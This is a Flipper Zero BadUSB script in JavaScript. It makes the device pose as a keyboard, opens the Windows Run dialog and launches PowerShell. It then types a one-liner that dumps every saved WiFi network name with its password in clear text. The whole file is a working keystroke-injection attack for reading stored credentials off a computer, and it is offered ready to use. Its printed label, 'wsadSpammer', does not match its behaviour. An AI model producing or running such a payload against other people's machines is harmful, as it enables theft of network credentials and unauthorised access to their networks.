let badusb = require("badusb");

print("wsadSpammer");

badusb.setup({
    vid: 0x0483,
    pid: 0xA27B,
    mfr_name: "Flipper Zero",
    prod_name: "BadUSB",
    layout: "/ext/badusb/assets/layouts/en-US.kl"
});

delay(2000);
while (!badusb.isConnected()) delay(500);
print("Connected - Showiing WiFi passwords on pc");

delay(200);
badusb.press("GUI", "r");
delay(200)
badusb.print("powershell", 200);
delay(500);
badusb.press("ENTER");
delay(500);
badusb.print("(netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object { $name = $_.Matches.Groups[1].Value.Trim(); $pass = (netsh wlan show profile name=$name key=clear | Select-String 'Key Content\W+\:(.+)$').Matches.Groups[1].Value.Trim(); [PSCustomObject]@{PROFILE_NAME=$name; PASSWORD=$pass} } | Format-Table -AutoSize",10);
delay(500);
badusb.press("ENTER");
delay(200);


badusb.quit();
